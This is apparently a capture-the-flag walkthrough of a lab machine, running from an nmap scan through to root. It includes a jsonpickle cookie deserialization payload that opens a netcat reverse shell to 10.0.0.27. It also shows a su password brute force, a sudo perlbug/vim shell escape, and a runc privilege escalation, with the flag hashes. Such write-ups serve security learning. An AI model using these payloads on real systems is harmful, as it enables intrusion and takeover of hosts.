### ***Target: 10.0.0.30***

## ***NMAP***

    # nmap -sS -T4 -p- 10.0.0.30

    22/tcp   open  ssh                                                                                        
    80/tcp   open  http                                                                                       
    5000/tcp open  upnp

## ***UPnP | PORT 5000***

Base64 decoding the cookie.

    {"py/object": "__main__.User", "username": "Rick"}

Going to ***http://10.0.0.30/whoami*** and changing the serialized cookie username to a different string we get a different output.

{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["nc", "10.0.0.27", "4444", "-e", "/bin/bash"]}]}]}

### ***/home/morty/.important***

    -***You are completely crazy Morty to keep a password that easy! Change it before you get hacked!***-
    Rick

I searched for linux brute force su command and found this github repository ***https://github.com/carlospolop/su-bruteforce***.

www-data@rick:/tmp/exploit$ ./suBF.sh -u morty -w ./top12000.txt
./suBF.sh -u morty -w ./top12000.txt
  [+] Bruteforcing morty...
  You can login as morty using password: internet

    $ sudo -ll
    Matching Defaults entries for morty on rick:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User morty may run the following commands on rick:

    Sudoers entry:
        RunAsUsers: rick
        Options: !authenticate
        Commands:
            /usr/bin/perlbug

Running the command as rick and opening the vim editor we are able to get a shell as the user 'rick'.

    $ sudo -u rick perlbug

    :!/bin/bash

### ***/home/rick/user.txt***
    a52d68b19ebca39c7b821ab1a51fef2e  -

    $ sudo -ll
    Matching Defaults entries for rick on rick:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User rick may run the following commands on rick:

    Sudoers entry:
        RunAsUsers: ALL
        RunAsGroups: ALL
        Options: !authenticate
        Commands:
            /usr/sbin/runc

Following the steps found on ***https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation*** and running runc with sudo we are able to get a shell as the root user.

    # id -a
    uid=0(root) gid=0(root) groups=0(root)


### ***/root/root.txt*** 
    256fdda9b4e714bf9f38a92750debf70  -